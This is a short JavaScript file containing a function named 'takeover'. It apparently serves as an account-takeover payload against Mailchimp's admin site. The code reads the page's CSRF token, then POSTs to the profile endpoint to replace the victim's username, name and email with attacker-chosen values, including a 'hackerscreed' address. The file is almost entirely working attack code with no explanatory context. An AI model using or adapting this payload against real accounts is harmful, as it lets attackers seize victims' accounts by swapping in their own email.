function takeover(){
	csrf_token=document.getElementsByName('__csrf_token')[0].value;
	url='https://us1.admin.mailchimp.com/i/account/profile/post/'

	var xhttp = new XMLHttpRequest();
	xhttp.onreadystatechange = function() {
	xhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded")

    if (this.readyState == 4 && this.status == 200) {
       // Typical action to be performed when the document is ready:
       //document.getElementById("demo").innerHTML = xhttp.responseText;
    }
};
xhttp.open("POST", url, true);
xhttp.send("username=imran1121&fname=imran&lname=parray&email=hackerscreed1122211%40gmail.com&url=https%3A%2F%2Fgoogle.com&current_password=&password=&confirm_password=&__csrf_token="+csrf_token+"&__fallback__=true&sec_type=undefined&sec_answer=undefined");

}
